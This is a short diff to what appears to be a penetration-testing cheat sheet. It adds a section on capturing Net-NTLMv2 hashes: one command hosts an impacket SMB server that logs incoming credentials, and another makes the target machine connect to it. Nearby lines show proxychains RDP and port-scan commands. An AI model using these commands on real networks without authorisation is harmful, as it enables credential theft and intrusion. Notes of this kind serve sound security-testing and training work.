@@ -412,6 +412,13 @@ proxychain nmap portscan on one host
 	proxychains xfreerdp /v:INTERNALIP /u:username /p:password
 proxychain rdp connect  
 
+## Net-NTLMv2 hash catching
+	impacket-smbserver -ip <host-ip> TMP /tmp -smb2support -debug -outputfile outfile.txt
+Host an smb server to catch smb credentials. Hashes will be found in `./outfile.txt`  
+
+	dir \\<host-ip>\tmp
+From target machine, initiate an smb connection.  
+
 # APPENDIX
 ## Kali built-in wordlists
 ### Passwords
